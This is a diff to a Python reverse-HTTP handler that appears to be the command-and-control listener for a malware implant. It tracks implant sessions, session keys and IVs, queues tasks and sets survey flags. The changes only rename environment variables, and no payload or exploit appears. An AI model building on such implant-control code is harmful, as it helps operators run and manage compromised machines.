@@ -175,7 +175,7 @@ class ReverseHttpHandler(ReverseConnectionHandler):
             caller.session_list[cookie]['watchdog'].start()
             #eh.ui.Echo("Called GET TASK handler", eh.ECHO_DEFAULT, console_id = cid)
             i = 0
-            get_task_to = int(eh.ui.GetEnv("MIBA_GET_TASK_TIMEOUT", console_id = cid))
+            get_task_to = int(eh.ui.GetEnv("CLSP_GET_TASK_TIMEOUT", console_id = cid))
             while not len(caller.task_list[cookie]) or all_tasks_processed():
                 i+=1
                 time.sleep(0.1)
@@ -207,7 +207,7 @@ class ReverseHttpHandler(ReverseConnectionHandler):
         task_rid = int(caller.headers['task_rid'], 10)
         cid = caller.session_list[cookie]['console_id']
         i = 0
-        task_result_to = int(eh.ui.GetEnv("MIBA_TASK_RESULT_TIMEOUT", console_id = cid))
+        task_result_to = int(eh.ui.GetEnv("CLSP_TASK_RESULT_TIMEOUT", console_id = cid))
         while len(caller.task_list[cookie]) and caller.task_list[cookie][task_rid]['status'] != const.STATUS_POSTED:
             i+=1
             time.sleep(0.1)
@@ -286,32 +286,32 @@ class ReverseHttpHandler(ReverseConnectionHandler):
         eh.ui.SetHostname(caller.address_string(), console_id=available_cid)
         eh.ui.LockModule("clsp", console_id=available_cid)
         
-        eh.ui.SetEnv("MIBA_TASK_RESULT_TIMEOUT", 15, console_id=available_cid)
-        eh.ui.SetEnv("MIBA_GET_TASK_TIMEOUT", 60, console_id=available_cid)
+        eh.ui.SetEnv("CLSP_TASK_RESULT_TIMEOUT", 15, console_id=available_cid)
+        eh.ui.SetEnv("CLSP_GET_TASK_TIMEOUT", 60, console_id=available_cid)
 
         eh.ui.Echo("Implant version: " + implant_info.implant_version.get()[::-1].hex(), eh.ECHO_DEFAULT, console_id=available_cid)
-        eh.ui.SetEnv("MIBA_VERSION", implant_info.implant_version.get()[::-1].hex(), console_id=available_cid)            
+        eh.ui.SetEnv("CLSP_VERSION", implant_info.implant_version.get()[::-1].hex(), console_id=available_cid)            
         
         eh.ui.Echo("Implant session: " + cookie, eh.ECHO_DEFAULT, console_id=available_cid)
-        eh.ui.SetEnv("MIBA_SESSION", cookie, console_id=available_cid)
+        eh.ui.SetEnv("CLSP_SESSION", cookie, console_id=available_cid)
 
         eh.ui.Echo("Implant id: " +  str(int.from_bytes(implant_info.implant_id.get(), "little")), eh.ECHO_DEFAULT, console_id=available_cid)
-        eh.ui.SetEnv("MIBA_ID", str(int.from_bytes(implant_info.implant_id.get(), "little")), console_id=available_cid)
+        eh.ui.SetEnv("CLSP_ID", str(int.from_bytes(implant_info.implant_id.get(), "little")), console_id=available_cid)
         
         eh.ui.Echo("Implant session key: " + implant_info.session_key.get().hex(), eh.ECHO_DEFAULT, console_id=available_cid)
-        eh.ui.SetEnv("MIBA_KEY", implant_info.session_key.get().hex(), console_id=available_cid)
+        eh.ui.SetEnv("CLSP_KEY", implant_info.session_key.get().hex(), console_id=available_cid)
         caller.session_list[cookie]['key'] = implant_info.session_key.get().hex()
 
         eh.ui.Echo("IV key: " + hello_response.next_iv.get().hex(), eh.ECHO_DEFAULT, console_id=available_cid)
-        eh.ui.SetEnv("MIBA_IV", hello_response.next_iv.get().hex(), console_id=available_cid)
+        eh.ui.SetEnv("CLSP_IV", hello_response.next_iv.get().hex(), console_id=available_cid)
         caller.session_list[cookie]['iv'] = hello_response.next_iv.get().hex()
         
         if(int.from_bytes(implant_info.implant_arch.get(), "little") == const.X64_ARCH):
             eh.ui.Echo("Implant architecture: X64", eh.ECHO_DEFAULT, console_id=available_cid)
-            eh.ui.SetEnv("MIBA_ARCH", "X64", console_id=available_cid)
+            eh.ui.SetEnv("CLSP_ARCH", "X64", console_id=available_cid)
         else:
             eh.ui.Echo("Implant architecture: X32", eh.ECHO_DEFAULT, console_id=available_cid)
-            eh.ui.SetEnv("MIBA_ARCH", "X32", console_id=available_cid)
+            eh.ui.SetEnv("CLSP_ARCH", "X32", console_id=available_cid)
             
         if(int.from_bytes(implant_info.platform_arch.get(), "little") == const.X64_ARCH):
             eh.ui.Echo("Platform architecture: X64", eh.ECHO_DEFAULT, console_id=available_cid)
@@ -334,12 +334,12 @@ class ReverseHttpHandler(ReverseConnectionHandler):
         eh.ui.SetEnv("HTTP_LISTENER_PORT", str(caller.http_port), console_id=available_cid)
         caller.db_worker.update_db(cookie, caller.session_list[cookie]['key'], caller.session_list[cookie]['iv'], available_cid, caller.session_list[cookie]['watchdog'].time())
         
-        eh.ui.SetEnv("MIBA_CONNECTION_TYPE", self.ENV_CONNECTION_TYPE, console_id=available_cid)
+        eh.ui.SetEnv("CLSP_CONNECTION_TYPE", self.ENV_CONNECTION_TYPE, console_id=available_cid)
 
         if self.nosurvey:
-            eh.ui.SetEnv("MIBA_SURVEY_RUN", "false", console_id=available_cid)
+            eh.ui.SetEnv("CLSP_SURVEY_RUN", "false", console_id=available_cid)
         else:
-            eh.ui.SetEnv("MIBA_SURVEY_RUN", "true", console_id=available_cid)
+            eh.ui.SetEnv("CLSP_SURVEY_RUN", "true", console_id=available_cid)
         self.response(caller, None, 200, cid = available_cid)
         #old_cid = eh.CONSOLE_ID
         #eh.ui.UseConsoleContext(available_cid)
